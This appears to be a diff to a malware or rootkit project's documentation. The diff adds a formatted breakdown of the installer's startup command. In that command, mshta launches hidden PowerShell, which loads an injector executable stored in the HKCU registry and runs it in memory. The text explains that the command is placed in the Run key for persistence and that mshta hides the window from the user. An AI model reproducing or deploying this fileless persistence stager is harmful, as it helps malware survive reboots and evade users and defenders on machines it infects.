@@ -30,6 +30,25 @@ The installer's job:
 mshta "javascript:close(new ActiveXObject('WScript.Shell').run('powershell \"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\\\"Software\\\\Microsoft\\\\Internet Explorer\\\").GetValue($Null)).EntryPoint.Invoke(0,$Null)\"',0))"
 ```
 
+This is a formatted version of the above line:
+
+```
+mshta "
+	javascript:close(
+		new ActiveXObject('WScript.Shell')
+			.run('
+				powershell \"
+					[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser
+						.OpenSubKey(\\\"Software\\\\Microsoft\\\\Internet Explorer\\\")
+						.GetValue($Null))
+						.EntryPoint
+						.Invoke(0,$Null)
+				\"
+			',0)
+	)
+"
+```
+
 This startup command is written to the HKCU\...\Run key. It may only have 260 characters (MAX_PATH). Powershell.exe loads Injector.exe from the registry and executes it in memory. Injector.exe is required to be written in C#! Because of the MAX_PATH restriction, there is only room to perform a simple Assembly.Load().EntryPoint.Invoke() here.
 
 mshta.exe is not essential. But without it, a powershell window is briefly visible. The JavaScript allows to start powershell with SW_HIDE.
